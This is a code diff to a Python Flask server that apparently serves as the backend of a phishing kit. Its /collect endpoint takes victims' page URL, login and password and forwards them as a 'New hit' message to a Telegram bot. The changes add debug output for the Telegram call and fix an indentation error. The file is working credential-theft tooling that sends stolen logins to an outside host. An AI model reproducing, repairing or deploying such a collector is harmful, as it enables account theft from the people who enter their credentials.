@@ -1,4 +1,3 @@
-# language: Python, file: main.py
 from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 import requests
@@ -14,14 +13,15 @@ CHAT_ID   = os.getenv("CHAT_ID", "8784493975")
 def send_to_tg(text: str):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
-        requests.post(url, json={
+        r = requests.post(url, json={
             "chat_id": CHAT_ID,
             "text": text,
             "parse_mode": "HTML",
             "disable_web_page_preview": True
         }, timeout=8)
-    except:
-        pass
+        print("TG response:", r.status_code, r.text)
+    except Exception as e:
+        print("TG error:", e)
 
 @app.route("/collect", methods=["POST"])
 def collect():
@@ -43,9 +43,10 @@ def collect():
     page     = data.get("url", "—")
     login    = data.get("login", "—")
     password = data.get("password", "—")
+    
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
     
-   msg = f"""🚨 <b>New hit</b>
+    msg = f"""🚨 <b>New hit</b>
 ⏰ {now}
 🔑 <b>Login:</b> <code>{login}</code>
 🔒 <b>Password:</b> <code>{password}</code>
